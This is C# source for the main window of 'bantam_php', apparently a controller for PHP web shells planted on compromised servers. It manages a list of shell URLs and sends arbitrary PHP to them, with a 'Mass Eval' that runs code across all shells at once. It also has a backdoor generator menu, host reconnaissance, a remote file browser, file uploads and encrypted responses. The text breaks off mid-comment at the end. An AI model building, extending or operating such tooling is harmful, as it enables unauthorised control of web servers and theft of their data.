using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace bantam_php
{
    public partial class BantamMain : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public static string g_OpenFileName;

        /// <summary>
        /// 
        /// </summary>
        public static string g_SelectedShellUrl;

        /// <summary>
        /// 
        /// </summary>
        public static Dictionary<String, ShellInfo> Shells = new Dictionary<String, ShellInfo>();

        /// <summary>
        /// Static Forms
        /// </summary>
        public ModifyShell addClientForm, updateHostForm;
        public BackdoorGenerator backdoorGenerator;

        /// <summary>
        ///
        ///
        /// </summary>
        public BantamMain()
        {
            InitializeComponent();

            //has to be initialized with parameters manually because, constructor with params breaks design mode...
            txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);
        }

        #region HELPER_FUNCTIONS

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public bool validTarget(string shellUrl = "")
        {
            if (string.IsNullOrEmpty(shellUrl)) {
                shellUrl = g_SelectedShellUrl;
            }

            if (string.IsNullOrEmpty(shellUrl) == false
             && Shells.ContainsKey(shellUrl)
             && Shells[shellUrl].down == false) {
                return true;
            }
            return false;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="pingMS"></param>
        public void addClientMethod(string shellUrl, string pingMS)
        {
            ListViewItem lvi = new ListViewItem(new string[] { shellUrl, pingMS + " ms" }) {
                Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)))
            };
            listViewClients.Items.Add(lvi);

            if (pingMS == "-") {
                int lastIndex = listViewClients.Items.Count - 1;
                listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;

                Shells[shellUrl].down = true;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellURL"></param>
        public void guiCallbackRemoveShellURL(string shellURL)
        {
            ListViewItem selectedLvi = listViewClients.FindItemWithText(shellURL);
            if (selectedLvi != null) {
                listViewClients.FindItemWithText(shellURL).Remove();
            }
        }

        /// <summary>
        /// Starts a thread that executes the php code
        /// </summary>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        public async void executePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int responseEncryptionMode)
        {
            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(url, phpCode, encryptResponse));

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;
                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    MessageBox.Show("No Data Returned", "Welp..");
                    return;
                }

                GuiHelper.RichTextBoxDialog(title, result);
            } else {
                MessageBox.Show("No Data Returned", "Welp...");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        public async void InitializeShellData(string shellUrl)
        {
            if (string.IsNullOrEmpty(shellUrl) == false) {

                string[] data = { null };     
                bool encryptResponse = Shells[shellUrl].responseEncryption;
                int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                if (!Helper.IsValidUri(shellUrl)) {
                    addClientMethod(shellUrl, "-");
                    return;
                }

                var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.InitShellData(encryptResponse), encryptResponse);

                //todo add to global config delay
                if (await Task.WhenAny(task, Task.Delay(10000)) == task) {

                    ResponseObject response = task.Result;

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                        }

                        data = result.Split(new string[] { PhpHelper.g_delimiter }, StringSplitOptions.None);

                        var initDataReturnedVarCount = Enum.GetValues(typeof(PhpHelper.INIT_DATA_VARS)).Cast<PhpHelper.INIT_DATA_VARS>().Max();

                        if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                            addClientMethod(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
                            Shells[shellUrl].Update(pingWatch.ElapsedMilliseconds, data);
                        } else {
                            addClientMethod(shellUrl, "-");
                        }
                    } else {
                        addClientMethod(shellUrl, "-");
                    }
                    pingWatch.Stop();
                } else {
                    addClientMethod(shellUrl, "-");
                }
            }
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void userAgentSwitcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string userAgent = "User Agent: " + WebHelper.g_GlobalDefaultUserAgent;
            string newUserAgent = GuiHelper.UserAgentSwitcher(userAgent, "Change User Agent");

            if (newUserAgent != "") {
                WebHelper.g_GlobalDefaultUserAgent = newUserAgent;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            bool checkBoxChecked = true;
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, "", ref checkBoxChecked);

            if (string.IsNullOrEmpty(code) == false) {
                if (checkBoxChecked) {
                    executePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, responseEncryptionMode);
                } else {
                    await WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
                }
            }
        }

        /// <summary>
        /// Mass Eval!  
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void evalToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            bool bShow = false;
            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", "", ref bShow);

            foreach (ListViewItem lvClients in listViewClients.Items) {
                string shellUrl = lvClients.Text;
                if (Shells.ContainsKey(shellUrl)) {
                    bool encryptResponse = Shells[shellUrl].responseEncryption;
                    WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
                    //todo show/track responses
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void viewPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void pingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);

            if (lvi != null
            && (Shells[shellUrl].pingStopwatch == null || Shells[shellUrl].pingStopwatch.IsRunning == false)) {

                Shells[shellUrl].pingStopwatch = new Stopwatch();
                Shells[shellUrl].pingStopwatch.Start();

                //todo test this when shell has gone away
                string phpCode = PhpHelper.PhpTestExecutionWithEcho(encryptResponse);
                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);

                if (string.IsNullOrEmpty(response.Result)) {
                    return;
                }

                string result = response.Result;

                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    MessageBox.Show("Error Decoding Response!", "Whoops!!!");
                    return;
                }

                lvi.SubItems[1].Text = Shells[shellUrl].pingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                Shells[shellUrl].pingStopwatch.Stop();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.PhpInfo(encryptResponse), encryptResponse);

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;

                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    MessageBox.Show("Error Decoding Response!", "Whoops!!!!!");
                    return;
                }

                BrowserView broView = new BrowserView(result, 1000, 1000);
                broView.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabPageFiles_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);
            if (lvi != null) {
                //copy a backup of the current file tree view into clients
                if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0) {
                    //Clear previously cached treeview to only store 1 copy
                    if (!string.IsNullOrEmpty(g_SelectedShellUrl)
                    && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
                        Shells[g_SelectedShellUrl].files.Nodes.Clear();
                    }
                    //store current treeview into client and clear
                    GuiHelper.CopyNodesFromTreeView(treeViewFileBrowser, Shells[g_SelectedShellUrl].files);
                    treeViewFileBrowser.Nodes.Clear();
                }

                if (!string.IsNullOrEmpty(g_SelectedShellUrl)
                 && Shells.ContainsKey(g_SelectedShellUrl)
                 && !string.IsNullOrEmpty(Shells[g_SelectedShellUrl].pwd)
                 && !string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                    Shells[g_SelectedShellUrl].pwd = txtBoxFileBrowserPath.Text;
                    //MessageBox.Show(Hosts[g_SelectedTarget].PWD);
                }

                g_SelectedShellUrl = lvi.SubItems[0].Text;

                foreach (ListViewItem lvClients in listViewClients.Items) {
                    //todo store color and revert to original color, for now skip if red
                    if (lvClients.BackColor != System.Drawing.Color.Red) {
                        lvClients.BackColor = System.Drawing.SystemColors.Window;
                        lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
                    }
                }

                if (lvi.BackColor != System.Drawing.Color.Red) {
                    lvi.BackColor = System.Drawing.SystemColors.Highlight;
                    lvi.ForeColor = System.Drawing.SystemColors.HighlightText;
                }

                if (validTarget() == false) {
                    lblDynCWD.Text = string.Empty;
                    lblDynFreeSpace.Text = string.Empty;
                    lblDynHDDSpace.Text = string.Empty;
                    lblDynServerIP.Text = string.Empty;
                    lblDynUname.Text = string.Empty;
                    lblDynUser.Text = string.Empty;
                    lblDynWebServer.Text = string.Empty;
                    lblDynGroup.Text = string.Empty;
                    lblDynPHP.Text = string.Empty;
                    txtBoxFileBrowserPath.Text = string.Empty;
                    return;
                } else {
                    lblDynCWD.Text = Shells[g_SelectedShellUrl].cwd;
                    lblDynFreeSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].freeHDDSpace) ? "0"
                                         : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].freeHDDSpace));

                    lblDynHDDSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].totalHDDSpace) ? "0"
                                        : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].totalHDDSpace));

                    lblDynServerIP.Text = Shells[g_SelectedShellUrl].ip;
                    lblDynUname.Text = Shells[g_SelectedShellUrl].unameRelease + " " + Shells[g_SelectedShellUrl].unameKernel;
                    lblDynUser.Text = Shells[g_SelectedShellUrl].uid + " ( " + Shells[g_SelectedShellUrl].user + " )";
                    lblDynWebServer.Text = Shells[g_SelectedShellUrl].serverSoftware;
                    lblDynGroup.Text = Shells[g_SelectedShellUrl].gid + " ( " + Shells[g_SelectedShellUrl].group + " )";
                    lblDynPHP.Text = Shells[g_SelectedShellUrl].PHP_Version;
                }

                if (tabControl1.SelectedTab == tabPageFiles) {
                    if (Shells[g_SelectedShellUrl].files.Nodes != null
                     && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
                        GuiHelper.CopyNodesFromTreeView(Shells[g_SelectedShellUrl].files, treeViewFileBrowser);
                        treeViewFileBrowser.Refresh();
                        treeViewFileBrowser.ExpandAll();

                        txtBoxFileBrowserPath.Text = Shells[g_SelectedShellUrl].pwd;
                    } else {
                        StartFileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            if (tabControl1.SelectedTab == tabPageFiles) {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes.Count == 0
                && Shells[shellUrl].files.Nodes != null
                && Shells[shellUrl].files.Nodes.Count > 0) {
                    //populate the treeview from cache
                    GuiHelper.CopyNodesFromTreeView(Shells[shellUrl].files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();

                    txtBoxFileBrowserPath.Text = Shells[shellUrl].pwd;
                } else {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0) {
                        StartFileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            XmlHelper.SaveShells(g_OpenFileName);
        }

        private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //keep alive checks with this?
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (addClientForm == null) {
                addClientForm = new ModifyShell();
            }
            addClientForm.Show();
        }

        private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
        {
            if (validTarget()) {
                phpToolStripMenuItem.Visible = true;
                systemToolstripMenuItem.Visible = true;
                softwareToolStripMenuItem.Visible = true;

                if (Shells[g_SelectedShellUrl].isWindows) {
                    linuxToolStripMenuItem.Visible = false;
                    windowsToolStripMenuItem.Visible = true;
                } else {
                    linuxToolStripMenuItem.Visible = true;
                    windowsToolStripMenuItem.Visible = false;
                }
            } else {
                phpToolStripMenuItem.Visible = false;
                systemToolstripMenuItem.Visible = false;
                softwareToolStripMenuItem.Visible = false;
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                listViewClients.SelectedItems[0].Remove();
                if (Shells.ContainsKey(g_SelectedShellUrl)) {
                    Shells.Remove(g_SelectedShellUrl);
                }
            }
        }

        private async void pingToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl)
             || Shells.ContainsKey(g_SelectedShellUrl) == false) {
                return;
            }

            string shellURL = g_SelectedShellUrl;
            string requestArgName = Shells[shellURL].requestArgName;
            bool sendViaCookie = Shells[shellURL].sendDataViaCookie;
            bool encryptResponse = Shells[shellURL].responseEncryption;
            int responseEncryptionMode = Shells[shellURL].responseEncryptionMode;

            listViewClients.FindItemWithText(shellURL).Remove();
            Shells.Remove(shellURL);

            Shells.Add(shellURL, new ShellInfo());
            Shells[shellURL].requestArgName = requestArgName;
            Shells[shellURL].sendDataViaCookie = sendViaCookie;
            Shells[shellURL].responseEncryption = encryptResponse;
            Shells[shellURL].responseEncryptionMode = responseEncryptionMode;

            InitializeShellData(shellURL);
        }

        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (backdoorGenerator == null) {
                backdoorGenerator = new BackdoorGenerator();
            }
            backdoorGenerator.Show();
        }

        private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK) {
                XmlHelper.SaveShells(saveShellsXMLDialog.FileName);
            }
        }

        private async void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var openShellXMLDialog = new OpenFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            }) 
            {
                if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                    foreach (ListViewItem lvClients in listViewClients.Items) {
                        if (Shells.ContainsKey(lvClients.Text)) {
                            Shells.Remove(lvClients.Text);
                        }
                        lvClients.Remove();
                    }
                    XmlHelper.LoadShells(openShellXMLDialog.FileName);
                    g_OpenFileName = openShellXMLDialog.FileName;
                    saveClientsToolStripMenuItem.Enabled = true;
                }
            }
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                string shellUrl = g_SelectedShellUrl;
                string varName = Shells[shellUrl].requestArgName;
                string varType = (Shells[shellUrl].sendDataViaCookie ? "cookie" : "post");

                updateHostForm = new ModifyShell(shellUrl, varName, varType);
                updateHostForm.Show();
            }
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// 
        /// </summary>
        private async void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
        {
            filebrowserGoBack();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpload_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;

            UploadFile u = new UploadFile(shellUrl, txtBoxFileBrowserPath.Text);
            u.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserGo_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_Version;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(txtBoxFileBrowserPath.Text, phpVersion, encryptResponse);
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);

            if (string.IsNullOrEmpty(shellUrl) == false) {
                Shells[shellUrl].files.Nodes.Clear();

                //if user didn't switch targets by the time this callback is triggered clear the live treeview
                if (g_SelectedShellUrl == shellUrl) {
                    treeViewFileBrowser.Nodes.Clear();
                    treeViewFileBrowser.Refresh();
                }

                //set path
                string path = txtBoxFileBrowserPath?.Text;
                if (string.IsNullOrEmpty(path)) {
                    path = ".";
                }

                if (response.Result != null && response.Result.Length > 0) {
                    string result = response.Result;
                    if (encryptResponse) {
                        result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                    }
                    FileBrowserRender(result, shellUrl);
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="result"></param>
        /// <param name="shellUrl"></param>
        private async void FileBrowserRender(string result, string shellUrl)
        {
            string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

            if (rows.Length > 0 && rows != null) {
                foreach (string row in rows) {
                    string[] columns = row.Split(new string[] { PhpHelper.g_delimiter }, StringSplitOptions.None);

                    if (columns != null && columns.Length - 2 > 0) {

                        string permissionOctal = Convert.ToString(Convert.ToInt32(columns[4]), 8);
                        string perms = permissionOctal.Substring(permissionOctal.Length - 4);

                        if (columns[columns.Length - 2] == "dir") {
                            //if the user switched targets we do not update the live filebrowser because it is for a different target
                            if (g_SelectedShellUrl == shellUrl) {
                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            } else {
                                //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add("", columns[0], 0);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            }
                        } else {
                            //if the user switched targets we do not update the live filebrowser because it is for a different target
                            if (g_SelectedShellUrl == shellUrl) {
                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            } else {
                                //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add("", columns[0], 6);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            }
                        }
                    }
                }
                treeViewFileBrowser.Sort();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private async void StartFileBrowser()
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            txtBoxFileBrowserPath.Text = Shells[shellUrl].cwd;

            if (Shells[shellUrl].isWindows) {
                txtBoxFileBrowserPath.Text = string.Empty;

                string phpCode = PhpHelper.GetHardDriveLettersPhp(encryptResponse);
                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);

                if (string.IsNullOrEmpty(response.Result)) {
                    return;
                }

                string result = response.Result;

                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result) == false) {
                    string[] drives = { null };
                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0) {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives) {
                            treeViewFileBrowser.Nodes.Add("", drive, 3);
                        }
                    }
                } else {
                    MessageBox.Show(response.Result, "Failed decoding response");
                }
            } else {
                string phpVersion = Shells[shellUrl].PHP_Version;

                string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(".", phpVersion, encryptResponse);
                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);

                if (response.Result != null && response.Result.Length > 0) {
                    string result = response.Result;
                    if (encryptResponse) {
                        result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                    }
                    if (!string.IsNullOrEmpty(result)) {
                        FileBrowserRender(result, shellUrl);
                    }
                }
            }

            if (tabControl1.SelectedTab != tabPageFiles) {
                tabControl1.SelectedTab = tabPageFiles;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StartFileBrowser();
        }

        /// <summary>
        /// 
        /// </summary>
        private async void filebrowserGoBack()
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            string phpVersion = Shells[shellUrl].PHP_Version;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
            string[] paths = txtBoxFileBrowserPath.Text.Split('/');
            string lastPathRemoved = string.Join("/", paths, 0, paths.Count() - 1);

            if (string.IsNullOrEmpty(lastPathRemoved)) {
                lastPathRemoved = "/";
            }

            string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(lastPathRemoved, phpVersion, encryptResponse);
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);

            if (string.IsNullOrEmpty(shellUrl) == false) {
                Shells[shellUrl].files.Nodes.Clear();

                if (g_SelectedShellUrl == shellUrl) {
                    treeViewFileBrowser.Nodes.Clear();
                    treeViewFileBrowser.Refresh();

                    txtBoxFileBrowserPath.Text = lastPathRemoved;

                    string path = txtBoxFileBrowserPath?.Text;
                    if (string.IsNullOrEmpty(path)) {
                        path = ".";
                    }

                    if (response.Result != null && response.Result.Length > 0) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                        }
                        if (!string.IsNullOrEmpty(result)) {
                            FileBrowserRender(result, shellUrl);
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_Version;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0) {
                string path = tn.FullPath.Replace('\\', '/');

                if (path.Contains("..")) {
                    filebrowserGoBack();
                } else {
                    string fullPath = string.Empty;
                    if (Shells[shellUrl].isWindows) {
                        fullPath = path;
                    } else {
                        fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                    }

                    string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(fullPath, phpVersion, encryptResponse);
                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                        }

                        if (string.IsNullOrEmpty(result)) {
                            MessageBox.Show("Error Decoding Response", "Whoops!!!!");
                            return;
                        }
                        string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

                        if (rows.Length > 0 && rows != null) {
                            foreach (string row in rows) {
                                string[] columns = row.Split(new string[] { PhpHelper.g_delimiter }, StringSplitOptions.None);

                                if (columns != null && columns.Length - 2 > 0) {

                                    string permissionOctal = Convert.ToString(Convert.ToInt32(columns[4]), 8);
                                    string perms = permissionOctal.Substring(permissionOctal.Length - 4);

                                    if (columns[columns.Length - 2] == "dir") {
                                        if (shellUrl == g_SelectedShellUrl) {
                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false) {
                                                lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            } else {
                                                lastTn.ToolTipText = perms;
                                            }
                                        } else {
                                            //TODO update their client cache here user changed clients
                                        }
                                    } else {
                                        if (shellUrl == g_SelectedShellUrl) {
                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
                                            if (string.IsNullOrEmpty(columns[2]) == false) {
                                                lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            } else {
                                                lastTn.ToolTipText = perms;
                                            }
                                        } else {
                                            //TODO update their client cache here user changed clients
                                        }
                                    }
                                } else {
                                    //MessageBox.Show(columns[0]);
                                }
                            }
                            tn.Expand();
                            treeViewFileBrowser.Sort();
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            if (treeViewFileBrowser.Nodes != null
             && treeViewFileBrowser.Nodes.Count > 0) {
                Shells[g_SelectedShellUrl].files.Nodes.Clear();
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            StartFileBrowser();
        }


        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
